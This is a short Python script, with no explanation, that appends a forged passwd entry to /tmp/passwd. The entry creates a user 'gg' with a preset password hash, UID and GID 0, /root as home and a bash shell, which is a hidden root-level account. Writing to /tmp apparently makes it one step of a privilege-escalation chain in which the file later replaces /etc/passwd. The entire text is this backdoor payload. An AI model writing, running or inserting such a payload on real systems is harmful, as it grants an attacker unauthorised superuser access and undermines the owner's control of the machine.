import os
APPEND_CONTENT = b"gg:$5$a$gemgwVPxLx/tdtByhncd4joKlMRYQ3IVwdoBXPACCL2:0:0:gg:/root:/bin/bash\n"
f  = open("/tmp/passwd","ab")
f.write(APPEND_CONTENT)
f.close()